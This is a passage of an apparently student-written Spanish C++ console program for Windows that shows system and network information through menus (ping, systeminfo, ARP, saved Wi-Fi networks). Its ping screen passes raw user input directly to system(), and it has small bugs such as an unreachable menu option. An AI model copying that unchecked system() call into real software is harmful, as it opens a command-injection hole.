//LIBRERIAS QUE USAREMOS:
#include <windows.h> //PARA USAR RECURSOS DEL EQUIPO; PING, CARACTYERISTICAS ETC
#include <iostream> //para entrada y salida de datos
#include <string.h> 
#include <conio.h> //PARA DAR APARIENCIA AL PROGRAMA ETC:
#include <stdlib.h> 
#include <stdio.h>
#include <math.h> //PARA OPERACIONES MATEMATICAS
#include <locale.h> //PARA USAR TIPOGRAFICA EN ESPA?OL
#include <time.h> //PARA OPCIONES DE TIEMPO EN ESTE CASO DELAY
#include <cctype>
#include <iomanip>//PARA REDONDEAR VALOREES
#include <cmath>//PARA REDONDEAR VALOREES
#include <fstream>
#include <cstdlib>
#include <ctime>

//DEFINICIONES PARA EDITAR MAS RAPIDO
#define s1 "\n"
#define s2 "\n\n"
#define t "                           "
#define t1 "               "
#define s5 "     "
#define s3 "   "
#define p "           "
#define p1 "         "
#define b " ####################################################################### "
#define br " ########################################################################### "
#define b1 "##########################################################################################################"
#define b2 " ######################################################################################################################"

using namespace std;

//FUNCIONES LLAMADOS
bool esEntero(string);//BOLEANO PARA VALIDACION DE ENTERO
void emerson();
void menu();
void menuredes();
void pausa();
void limpiar();
void liberal();
void salir();
void pin();
//void ram();
void delay(int secs);
void infequipo();
void fullinf();
void cfecha();
void chora();
void redesguardadas();
void vermac();
void interfaces();
void driver();
void arp();
void protocolos();
void aplicaciones();
void menuhack();
void USB();
void simulacion1();
void simulacion2();

////VENTANAS TAMA?O/////
void vemerson();
void vmenu();
void vpin();
//void vram();
void vcfecha();
void vchora();
void vinfequipo();
void vfullinf();
void vmenuredes();
void vredesguardadas();
void vvermac();
void vinterfaces();
void vdriver();
void varp();
void vprotocolos();
void vaplicaciones();
void vmenuhack();
void vUSB();

//DEFINICIOES DE VENTANA
HANDLE wHnd;
HANDLE hConsole = GetStdHandle( STD_OUTPUT_HANDLE );


void ct(int color)	//listo
{
	SetConsoleTextAttribute(hConsole, color);
}

int main()
{
	//AJUSTES DEL IDIOMA ESPA?OL
	setlocale(LC_ALL, "spanish");
    
    //CORRER LAS FUNCIONES DEL PROGRAMA
    emerson();
    return 0;
}

bool esEntero(string linea)	//LISTO
{
	bool esEntero = true;
	int longitud = linea.size();
	
	if (longitud == 0) {
		esEntero = false;
	} else if (longitud == 1 && !isdigit(linea[0])) {
		esEntero = false;
	} else {
		int indice = 0;
		if (linea[0] == '+' || linea[0] == '-') {
			indice = 1;
		} else {
			indice = 0;
		}
		
		while (indice < longitud) {
			if (!isdigit(linea[indice])) {
				esEntero = false;
				break;
			}
			indice++;
		}
	}
	
	
	return esEntero;	
}

void emerson()	//LISTO
{
	limpiar();
	vemerson();
	
    SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada");
	ct(1);cout<<b<<s1;
	ct(15);cout<<p1<<"SENA - Centro de Tecnologia de la Manufactura Avanzada"<<s1;
	ct(1);cout<<b<<s1;
	ct(15);cout<<t1<<"NOMBRE: ";ct(11);cout<<"Emerson de jesus granda tilano"<<s1;
	ct(15);cout<<t1<<"PROGRAMA: ";ct(11);cout<<"Gestion De Redes De Datos"<<s1;
	ct(15);cout<<t1<<"FICHA: ";ct(10);cout<<"2451724"<<s1;
	ct(1);cout<<b<<s1;
	ct(15);cout<<t<<s5<<"MENU"<<s1<<t1<<"INGRESE UNA DE OPCION DE LA LISTA"<<s1;
	ct(1);cout<<b<<s1;
	ct(15);
	
	//INICIO SUB MENU
	string linea;
	int numero;
	bool repite = true;
	
	do{
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"1";ct(15);cout<<" - PARA CONTINUAR."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"2";ct(15);cout<<" - PARA SALIR."<<s1;
		ct(11);cout<<t1<<"    ";
		getline(cin, linea);
		liberal();
		if (esEntero(linea))
		{
			repite = false;
			numero = atoi(linea.c_str());
			
			if(numero >= 1 && numero <=2)
			{
				switch (numero)
				{
					case 1:
						delay(1);
						menu();
					break;
					
					case 2:
						delay(1);
						salir();
					break;
				}
				
			}else{
				ct(1);cout<<b;
				ct(15);
				cout<<s1<<t1<<numero<<" NO ES UNA OPCION DEL MENU"<<s1<<t1<<"INTENTE DE NUEVO EN 3 SEGUNDOS."<<s1;
				ct(1);cout<<b<<s1;
				delay(3); 
				emerson();
			}
			
		}else{
			ct(1);cout<<b;
			ct(15);
			cout<<s1<<t1<<linea<<" NO ES UNA OPCION DEL MENU"<<s1<<t1<<"INTENTE DE NUEVO EN 3 SEGUNDOS."<<s1;
			ct(1);cout<<b<<s1;
			delay(3);
			emerson();
		}
	} while (repite);
	
	cin.get();

}

void menu()	//LISTO
{ 
	limpiar(); 
	vmenu();
    
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<b<<s1;
	ct(15);cout<<t<<"MENU PRINCIPAL"<<s1;
	ct(1);cout<<b<<s1;
	ct(15);cout<<t1<<"   INGRESE UNA DE OPCION DE LA LISTA"<<s1;
	ct(1);cout<<b<<s1;
	
	//VARIABLES DEL MENU
	string linea;
	int numero;
	bool repite = true;
	
	do{
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"1";ct(15);cout<<" - INFORMACION DEL EQUIPO / SERVIDOR."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"2";ct(15);cout<<" - INFORMACION DE REDES."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"3";ct(15);cout<<" - MENU REPARACIONES DEL SISTEMA."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"4";ct(15);cout<<" - VOLVER A INICIO."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"5";ct(15);cout<<" - PARA SALIR."<<s1;
		ct(11);cout<<t1<<"    ";
		getline(cin, linea);
		liberal();
		if (esEntero(linea))
		{
			repite = false;
			numero = atoi(linea.c_str());
			
			if(numero >= 1 && numero <=4)
			{
				switch (numero)
				{
					case 1:
						delay(1);
						infequipo();
					break;
					case 2:
						delay(1);
						menuredes();
					break;
					case 3:
						delay(1);
						menuhack();
					break;
					case 4:
						delay(1);
						salir();
					break;
					case 5:
						delay(1);
						salir();
					break;
					
				}
				
			}else{
				ct(1);cout<<b;
				ct(15);
				cout<<s1<<t1<<numero<<" NO ES UNA OPCION DEL MENU"<<s1<<t1<<"INTENTE DE NUEVO EN 3 SEGUNDOS."<<s1;
				ct(1);cout<<b<<s1;
				delay(3); 
				menu();
			}
			
		}else{
			ct(1);cout<<b;
			ct(15);
			cout<<s1<<t1<<linea<<" NO ES UNA OPCION DEL MENU"<<s1<<t1<<"INTENTE DE NUEVO EN 3 SEGUNDOS."<<s1;
			ct(1);cout<<b<<s1;
			delay(3);
			menu();
		}
	} while (repite);
	
	cin.get();
}

void pausa()	//LISTO
{
	system("pause>LOG");
}

void limpiar()	//LISTO
{
	system("cls");
}

void liberal()	//LISTO
{
	fflush(stdin);
}

void salir()	//LISTO
{
	exit(0);
}

void pin()	//LISTO
{
	limpiar(); 
	vpin();
    
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<br<<s1;
	ct(15);cout<<t1<<"ESCRIBA EL SIGUIENTE COMANDO PARA VER IPV4 CONECTADAS:"<<s1;
	ct(15);cout<<p1<<" ( ";ct(6);cout<<"ipconfig";ct(15);cout<<" )";
	ct(15);cout<<"/"<<"( ";ct(6);cout<<"ipconfig | find \"\IP\"\ ";ct(15);cout<<")";
	ct(15);cout<<"/"<<"( ";ct(6);cout<<"ipconfig | find \"\IPv4\"\ ";ct(15);cout<<")"<<s1;
	ct(1);cout<<br<<s1;
	ct(15);cout<<t1<<"OTROS COMANDOS:"<<s1;
	ct(15);cout<<p1<<"(";ct(6);cout<<"reintentar";ct(15);cout<<" / ";ct(6);cout<<"retry.";ct(15);cout<<")";cout<<" - ";ct(11);cout<<"Reintentar."<<s1;
	ct(15);cout<<p1<<"(";ct(6);cout<<"volver";ct(15);cout<<" / ";ct(6);cout<<"back.";ct(15);cout<<")";cout<<" - ";ct(11);cout<<"Volver menu anterior."<<s1;
	ct(15);cout<<p1<<"(";ct(6);cout<<"salir";ct(15);cout<<" / ";ct(6);cout<<"exit.";ct(15);cout<<")";cout<<" - ";ct(11);cout<<"Finalizar programa."<<s1;
	ct(1);cout<<br;
	ct(15);cout<<s1<<t1<<"PARA HACER PING A UNA DIRECION IP, ESCRIBA POR EJEMPLO:"<<s1;
	cout<<t<<s5<<" (";ct(6);cout<<"ping 126.0.0.0";ct(15);cout<<")"<<s1;
	cout<<p1<<" (";ct(6);cout<<"-a";ct(15);cout<<")";cout<<" - ";ct(11);cout<<"Resuelve direciones a nombres del host."<<s1;
	ct(15);cout<<p1<<" (";ct(6);cout<<"-t";ct(15);cout<<")";cout<<" - ";ct(11);cout<<"Ping infinito."<<s1;
	ct(15);cout<<p1<<" (";ct(6);cout<<"-n #";ct(15);cout<<")";cout<<" - ";ct(11);cout<<"Numero solicitudes."<<s1;
	ct(15);cout<<p1<<" (";ct(6);cout<<"-l #";ct(15);cout<<")";cout<<" - ";ct(11);cout<<"Tama?o Bufer."<<s1;
	ct(15);cout<<p1<<" (";ct(6);cout<<"-r #";ct(15);cout<<")";cout<<" - ";ct(11);cout<<"Registro ruta."<<s1;
	ct(15);cout<<p1<<" (";ct(6);cout<<"-6";ct(15);cout<<")";cout<<" - ";ct(11);cout<<"Fuerza show ipv6 del dominio."<<s1;
	ct(15);cout<<p1<<" (";ct(6);cout<<"-4";ct(15);cout<<")";cout<<" - ";ct(11);cout<<"Fuerza show ipv4 del dominio."<<s1;
	ct(15);cout<<p1<<" Ejemplo: ";ct(11);cout<<"ping -4 www.google.com"<<s1;
	cout<<p1<<" Haciendo: ping a www.google.com ";ct(10);cout<<"[142.250.78.4]";
	
	while(true){
		ct(1);cout<<s1<<br;
		ct(15);cout<<p1;
		cout<<s1<<p1<<"COMANDO: ";ct(6);
		string comando;
		getline(cin, comando);
		system(comando.c_str());
		if(comando == "salir" || comando == "Salir" || comando == "SALIR" || comando == "exit" || comando == "Exit" || comando == "EXIT")salir();
		if(comando == "reintentar"|| comando == "Reintentar" || comando == "REINTENTAR" || comando == "retry" || comando == "Retry" || comando == "RETRY")pin();
		if(comando == "volver"|| comando == "Volver" || comando == "VOLVER" || comando == "back" || comando == "Back" || comando == "BACK")menuredes();
		
	}
}


/*

void ram()	//LISTO
{
	limpiar(); 
	vram();
    
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	
	///INICIO CODIGO
	MEMORYSTATUSEX status;
	status.dwLength = sizeof(status);
	GlobalMemoryStatusEx(&status);
		    
	float Total_Ram = 0.0, Ram_reserva = 0.0, Ram_Usada = 0.0, Ram_Disponible = 0.0, elevador = 0.0;
	float Total_Ram_redon_0;
 	
	elevador = pow(1024, 3);
	Total_Ram = status.ullTotalPhys / elevador;
	Ram_Usada = (status.ullTotalPhys - status.ullAvailPhys) / elevador;
	Ram_Disponible = status.ullAvailPhys / elevador;
		    
	//VARIABLE  DONDE ALMACENE LOS DATOS DE TOTAL Total_Ram REDONDEADA.
	Total_Ram_redon_0 = round(Total_Ram);
	//A LA VARIABLE RESERVA LE ASIGNO EL RESTO DE DIVIDIR Total_Ram_redon_0 ENTRE Total_Ram.
	Ram_reserva = fmod(Total_Ram_redon_0, Total_Ram);
		    
	ct(1);cout<<b<<s1;
	ct(15);cout<<t1<<"    INFORMACION DE LA RAM DEL EQUIPO"<<s1;
	ct(1);cout<<b<<s1;
	ct(15);cout<<t1;
	cout << "TOTAL MEMORIA RAM INSTALADA: "<<round(Total_Ram)<<" GB"<<s1;//MUESTRA RAM TOTAL EN GB
	ct(15);cout<<t1;
	cout << "TOTAL MEMORIA RAM USABLE: "<<fixed<<setprecision(1)<<Total_Ram<<" GB"<<s1;//MUESTRA RAM TOTAL EN GB
	ct(15);cout<<t1;
	cout << "TOTAL MEMORIA RAM USADA: "<<fixed<<setprecision(1)<<Ram_Usada<<" GB"<<s1;//MUESTRA RAM USADA
	ct(15);cout<<t1;
	cout << "TOTAL MEMORIA RAM DISPONIBLE: "<<fixed<<setprecision(1)<<Ram_Disponible<<" GB"<<s1;//MUESTRA RAM DISPONIBLE
	ct(15);cout<<t1;
	cout << "TOTAL MEMORIA RAM RESERVADA: "<<fixed<<setprecision(1)<<Ram_reserva<<" MB"<<s1;//MUESTRA RAM RESERVADA
	ct(1);cout<<b<<s1;
	//INICIO SUB MENU
	ct(15);cout<<t<<s5<<"MENU"<<s1<<t1<<"INGRESE UNA DE OPCION DE LA LISTA"<<s1;
	ct(1);cout<<b<<s1;
	ct(15);
	string linea;
	int numero;
	bool repite = true;
	do
	{
		cout<<t1<<p1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"1";ct(15);cout<<" - ACTUALIZAR."<<s1;
		cout<<t1<<p1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"2";ct(15);cout<<" - MENU ANTERIOR."<<s1;
		cout<<t1<<p1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"3";ct(15);cout<<" - SALIR."<<s1;
		ct(11);cout<<t1<<p1<<"    ";
		getline(cin, linea);
		liberal();
		if (esEntero(linea))
		{
			repite = false;
			numero = atoi(linea.c_str());
					
			if(numero >= 1 && numero <=4)
			{
				switch (numero)
				{
					case 1:
						delay(1);
						ram();
					break;
					case 2:
						delay(1);
						infequipo();
					break;
					case 3:
						delay(1);
						salir();
					break;
				}			
			}else
			{
				ct(1);cout<<b;
				ct(15);
				cout<<s1<<t1;ct(4);cout<<numero;ct(15);cout<<" NO ES UNA OPCION DEL MENU"<<s1<<t1<<"INTENTE DE NUEVO EN 3 SEGUNDOS."<<s1;
				ct(1);cout<<b<<s1;
				delay(3); 
				ram();
			}
					
		}else
		{
			ct(1);cout<<b;
			ct(15);
			cout<<s1<<t1;ct(4);cout<<linea;ct(15);cout<<" NO ES UNA OPCION DEL MENU"<<s1<<t1<<"INTENTE DE NUEVO EN 3 SEGUNDOS."<<s1;
			ct(1);cout<<b<<s1;
			delay(3);
			ram();
		}
	} while (repite);
	cin.get();
    
}
*/


void delay(int secs)	//LISTO
{
	for(int i = (time(NULL) + secs); time(NULL) != i; time(NULL));
}

void cfecha()	//LISTO
{
	limpiar();
	vcfecha();
	//VARIABLES DEL MENU
	string linea;
	int numero;
	bool repite = true;
	ct(1);cout<<b<<s1;
	ct(15);cout<<t1<<"     FECHA DEL EQUIPO: ";ct(11);system("date /t");
	ct(15);cout<<t1<<"     HORA DEL EQUIPO: ";ct(11);system("time /t");
	ct(1);cout<<b<<s1;
	do
	{
		delay(1);
		ct(6);cout<<t1<<"?";ct(15);cout<<"DESEAS CAMBIAR LA FECHA DEL EQUIPO";ct(6);cout<<"?"<<s1;
		ct(15);cout<<"            "<<"Para cambiar la fecha del sistema ejecute,"<<s1<<t1<<"  "<<"este programa como administrador."<<s1;
		ct(10);cout<<t1<<p1<<s5<<"(";ct(15);cout<<"1";ct(10);cout<<" - ";ct(15);cout<<"SI";ct(10);cout<<")"<<s1;
		ct(10);cout<<t1<<p1<<s5<<"(";ct(15);cout<<"2";ct(10);cout<<" - ";ct(15);cout<<"NO";ct(10);cout<<")";
		cout<<s1<<t1<<p1<<s5<<"   ";ct(1);
		getline(cin, linea);
		liberal();
		if (esEntero(linea))
		{
			repite = false;
			numero = atoi(linea.c_str());
									
			if(numero >= 1 && numero <=2)
			{
				switch (numero)
				{
					case 1:
						delay(1);
						ct(1);cout<<b;
						ct(15);cout<<s1<<t1;system("date");
						delay(2);
						cout<<s1<<"     ";ct(4);cout<<"?";ct(15);cout<<"Si ejecuto el programa como administrador la fecha se cambio,";
						cout<<s1<<"     "<<"de lo contrario debe cerrar y ejecutar como administrador";ct(4);cout<<"?"<<s1;
						ct(1);cout<<b<<s1;
						delay(1);
						chora();
					
					break;
					case 2:
						delay(1);
						ct(1);cout<<b<<s1;
						chora();
					break;
		  		}
			}else{
					ct(1);cout<<b;
					ct(15);
					cout<<s1<<t1<<"    ";ct(4);cout<<numero;ct(15);cout<<" NO ES UNA OPCION DEL MENU."<<s1;
					ct(1);cout<<b<<s1;
					delay(3); 
					cfecha();
			}
		}else{
			ct(1);cout<<b;
			ct(15);
			cout<<s1<<t1<<"    ";ct(4);cout<<linea;ct(15);cout<<" NO ES UNA OPCION DEL MENU."<<s1;
			ct(1);cout<<b<<s1;
			delay(3);
			cfecha();
		}
			
	}while (repite);
						
}

void chora()	//LISTO
{
	limpiar();
	vchora();
	//VARIABLES DEL MENU
	string linea;
	int numero;
	bool repite = true;
	ct(1);cout<<b<<s1;
	ct(15);cout<<t1<<"     FECHA DEL EQUIPO: ";ct(11);system("date /t");
	ct(15);cout<<t1<<"     HORA DEL EQUIPO: ";ct(11);system("time /t");
	ct(1);cout<<b<<s1;
	do
	{
		delay(1);
		ct(6);cout<<t1<<"?";ct(15);cout<<"DESEAS CAMBIAR LA HORA DEL EQUIPO";ct(6);cout<<"?"<<s1;
		ct(15);cout<<"            "<<"Para cambiar la hora del sistema ejecute,"<<s1<<t1<<"  "<<"este programa como administrador."<<s1;
		ct(10);cout<<t1<<p1<<s5<<"(";ct(15);cout<<"1";ct(10);cout<<" - ";ct(15);cout<<"SI";ct(10);cout<<")"<<s1;
		ct(10);cout<<t1<<p1<<s5<<"(";ct(15);cout<<"2";ct(10);cout<<" - ";ct(15);cout<<"NO";ct(10);cout<<")";
		cout<<s1<<t1<<p1<<s5<<"   ";ct(1);
		getline(cin, linea);
		liberal();
		if (esEntero(linea))
		{
			repite = false;
			numero = atoi(linea.c_str());
									
			if(numero >= 1 && numero <=2)
			{
				switch (numero)
				{
					case 1:
						delay(1);
						ct(1);cout<<b;
						ct(15);cout<<s1<<t1;system("time");
						delay(4);
						cout<<s1<<"     ";ct(4);cout<<"?";ct(15);cout<<"Si ejecuto el programa como administrador la fecha se cambio,";
						cout<<s1<<"     "<<"de lo contrario debe cerrar y ejecutar como administrador";ct(4);cout<<"?"<<s1;
						ct(1);cout<<b<<s1;
						cout<<t1<<"     ";ct(15);cout<<"VOLVIENDO AL MENU ANTEROR";
						delay(1);cout<<".";
						delay(1);cout<<".";
						delay(1);cout<<"."<<s1;
						ct(1);cout<<b<<s1;
						infequipo();
					
					break;
					case 2:
						delay(1);
						ct(1);cout<<b<<s1;
						infequipo();
					break;
		  		}
			}else{
					ct(1);cout<<b;
					ct(15);
					cout<<s1<<t1<<"    ";ct(4);cout<<numero;ct(15);cout<<" NO ES UNA OPCION DEL MENU."<<s1;
					ct(1);cout<<b<<s1;
					delay(3); 
					chora();
			}
		}else{
			ct(1);cout<<b;
			ct(15);
			cout<<s1<<t1<<"    ";ct(4);cout<<linea;ct(15);cout<<" NO ES UNA OPCION DEL MENU."<<s1;
			ct(1);cout<<b<<s1;
			delay(3);
			chora();
		}
			
	}while (repite);
}

void infequipo()	//LISTO
{
	limpiar(); 
	vinfequipo();
    
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<b<<s1;
	ct(15);cout<<t1<<"   INFORMACION DEL EQUIPO / SERVIDOR"<<s1;
	ct(1);cout<<b<<s1;
	ct(15);cout<<t1<<"   INGRESE UNA DE OPCION DE LA LISTA"<<s1;
	ct(1);cout<<b<<s1;
	
	//VARIABLES DEL MENU
	string linea;
	int numero;
	bool repite = true;
	
	do{
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"1";ct(15);
		cout<<" - NOMBRE DEL EQUIPO Y PROPIETARIO."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"2";ct(15);
		cout<<" - HORA Y FECHA DEL EQUIPO."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"3";ct(15);
		cout<<" - INFORMACION DETALLADA DEL EQUIPO."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"4";ct(15);
		cout<<" - INFORMACION DETALLADA RAM."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"5";ct(15);
		cout<<" - LISTA APPS INSTALADAS."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"6";ct(15);
		cout<<" - VOLVER A MENU."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"7";ct(15);
		cout<<" - VOLVER A INICIO."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"8";ct(15);
		cout<<" - PARA SALIR."<<s1;
		ct(11);cout<<t1<<"    ";
		getline(cin, linea);
		liberal();
		if (esEntero(linea))
		{
			repite = false;
			numero = atoi(linea.c_str());
			
			if(numero >= 1 && numero <=8)
			{
				switch (numero)
				{
					case 1:
						delay(1);
						ct(1);cout<<b<<s1;
						ct(15);cout<<t1<<"NOMBRE DEL EQUIPO: ";ct(11);system("hostname");
						ct(15);cout<<t1<<"NOMBRE DEL PROPIETARIO: ";ct(11);system("whoami");
						ct(1);cout<<b<<s1;
						ct(15);cout<<t1<<"SELECIONE OTRA OPCION EN 3 SEGUNDOS.";
						delay(4);
						liberal();
						infequipo();
					break;
					case 2:
						delay(1);
						liberal();
						cfecha();
					break;
					case 3:
						delay(1);
						liberal();
						fullinf();
					break;
					case 4:
						delay(1);
						ct(1);cout<<b<<s1;	
						ct(15);cout<<t1<<"  ESCANEANDO INFORMACION DE MEMORIA RAM";
						delay(1);cout<<".";delay(1);cout<<".";delay(1);cout<<".";delay(1);cout<<s1;
						ct(1);cout<<b<<s1;
						liberal();
						system("run-rm.bat");
						delay(5);
						infequipo();
					break;
					case 5:
						delay(1);
						liberal();
						aplicaciones();
					break;
					case 6:
						delay(1);
						liberal();
						menu();
					break;
					case 7:
						delay(1);
						liberal();
						emerson();
					break;
					case 8:
						delay(1);
						liberal();
						ct(1);cout<<b<<s1;
						salir();
					break;
					
				}
				
			}else{
				ct(1);cout<<b;
				ct(15);
				cout<<s1<<t1;ct(4);cout<<numero;ct(15);cout<<" NO ES UNA OPCION DEL MENU"<<s1<<t1<<"INTENTE DE NUEVO EN 3 SEGUNDOS."<<s1;
				ct(1);cout<<b<<s1;
				delay(3); 
				infequipo();
			}
			
		}else{
			ct(1);cout<<b;
			ct(15);
			cout<<s1<<t1;ct(4);cout<<linea;ct(15);cout<<" NO ES UNA OPCION DEL MENU"<<s1<<t1<<"INTENTE DE NUEVO EN 3 SEGUNDOS."<<s1;
			ct(1);cout<<b<<s1;
			delay(3);
			infequipo();
		}
	} while (repite);
	
	cin.get();
}

void fullinf()	//LISTO
{
	limpiar(); 
	vfullinf();
    
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<b1<<s1;
	ct(15);cout<<t<<p1<<"INFORMACION COMPLETA DEL EQUIPO"<<s1;
	ct(1);cout<<b1<<s1;
	
	//VARIABLES DEL MENU
	int op;
					
	delay(1);
	ct(15);cout<<s1<<t1<<p1<<"LA INFORMACION TIENE UN LIMITE AL MOSTRARSE EN PANTALLA."<<s1;
	delay(1);
	ct(15);cout<<t1<<"  TIENES LA OPCION DE ELEGIR EL TIEMPO EN SEGUNDOS QUE DURARA LA INFORMACION."<<s1;
	delay(1);
	ct(15);cout<<t1<<t1<<"      TIEMPO RECOMENDADO 10 A 20 SEGUNDOS."<<s1;
	delay(2);
	ct(15);cout<<t1<<p1;cout<<"   ";ct(1);cout<<"INGRESE EL TIEMPO EN SEGUNDOS: ";cin>>op;
	liberal();
	cout<<s1;
	ct(1);cout<<b1<<s1;
	ct(15);cout<<t<<"    REGRESARA AL MENU ANTERIOR EN ";ct(1);cout<<op;ct(15);cout<<" SEGUNDOS"<<s1;
	ct(15);cout<<p1<<"     ";ct(6);cout<<"\"NO HAGA NINGUNA ACCION, HASTA QUE LA INFORMACION SEA PRESENTADA EN PANTALLA\".\ "<<s1;
	delay(2);
	ct(1);cout<<b1<<s1;
	ct(15);cout<<t;system("systeminfo");
	ct(1);cout<<b1<<s1;
	ct(15);cout<<t<<"    REGRESARA AL MENU ANTERIOR EN ";
	ct(1);cout<<op;ct(15);cout<<" SEGUNDOS                                   "<<s1;
	ct(1);cout<<b1;
	delay(op);
	infequipo();
	
}

void menuredes() //LISTO
{
	limpiar(); 
	vmenuredes();
    
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<b<<s1;
	ct(15);cout<<t<<"MENU REDES"<<s1;
	ct(1);cout<<b<<s1;
	ct(15);cout<<t1<<"   INGRESE UNA DE OPCION DE LA LISTA"<<s1;
	ct(1);cout<<b<<s1;
	ct(15);
	
	//VARIABLES DEL MENU
	string linea;
	int numero;
	bool repite = true;
	
	do{
		cout<<p1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"1";ct(15);
		cout<<" - PROBAR UN PING."<<s1;
		cout<<p1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"2";ct(15);
		cout<<" - VER REDES GUARDADAS."<<s1;
		cout<<p1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"3";ct(15);
		cout<<" - VER MAC DE ADAPTADORES DE RED."<<s1;
		cout<<p1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"4";ct(15);
		cout<<" - VER INTRERFACES CONECTADAS / USADAS."<<s1;
		cout<<p1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"5";ct(15);
		cout<<" - ESTADISTICAS DE RESOLUCION NetBIOS."<<s1;
		cout<<p1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"6";ct(15);
		cout<<" - ESTADISTICAS PROTOCOLOS TPC UDP, CONEXIONES ACTIVAS"<<s1;
		cout<<p1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"7";ct(15);
		cout<<" - TABLA ARP ";ct(6);cout<<"?";ct(15);cout<<"WHO IS ON MY NET";ct(6);cout<<"?"<<s1;
		cout<<p1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"8";ct(15);
		cout<<" - VER DRIVERS DE RED."<<s1;
		cout<<p1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"9";ct(15);
		cout<<" - VOLVER MENU ANTERIOR."<<s1;
		cout<<p1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"10";ct(15);
		cout<<" - SALIR."<<s1;
		ct(11);cout<<p1<<"    ";
		getline(cin, linea);
		liberal();
		if (esEntero(linea))
		{
			repite = false;
			numero = atoi(linea.c_str());
			
			if(numero >= 1 && numero <=10)
			{
				switch (numero)
				{
					case 1:
						delay(1);
						pin();
					break;
					case 2:
						delay(1);
						redesguardadas();
					break;
					case 3:
						delay(1);
						vermac();
					break;
					case 4:
						delay(1);
						interfaces();
					break;
					case 5:
						delay(1);
						ct(1);cout<<b;
						ct(8);system("nbtstat -r");
						ct(1);cout<<b<<s1;
						ct(15);cout<<p1<<"    REGRESARA AL MENU ANTERIOR EN ";ct(1);cout<<"7";ct(15);cout<<" SEGUNDOS"<<s1;
						delay(7);
						menuredes();
					break;
					case 6:
						delay(1);
						protocolos();
					break;
					case 7:
						delay(1);
						arp();
					break;
					case 8:
						delay(1);
						driver();
					break;
					case 9:
						delay(1);
						menu();
					break;
					case 10:
						delay(1);
						salir();
					break;
				}
				
			}else{
				ct(1);cout<<b;
				ct(15);
				cout<<s1<<t1;ct(4);cout<<numero;ct(15);cout<<" NO ES UNA OPCION DEL MENU"<<s1<<t1<<"INTENTE DE NUEVO EN 3 SEGUNDOS."<<s1;
				ct(1);cout<<b<<s1;
				delay(3); 
				menuredes();
			}
			
		}else{
			ct(1);cout<<b;
			ct(15);
			cout<<s1<<t1;ct(4);cout<<linea;ct(15);cout<<" NO ES UNA OPCION DEL MENU"<<s1<<t1<<"INTENTE DE NUEVO EN 3 SEGUNDOS."<<s1;
			ct(1);cout<<b<<s1;
			delay(3);
			menuredes();
		}
	} while (repite);
	
	cin.get();
	
}

void redesguardadas()	//LISTO
{
	limpiar();
	vredesguardadas();
	
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<br<<s1;
	ct(15);cout<<t<<"REDES GUARDADAS"<<s1;
	ct(1);cout<<br<<s1;
	cout<<"      ";ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);ct(15);cout<<"PARA CONECTARSE A UNA RED GUARDADA, INGRESA EL COMANDO:"<<s1;
	ct(6);cout<<"    "<<"netsh wlan connect ssid=(Nombre de red) name=(Nombre de red)"<<s1;
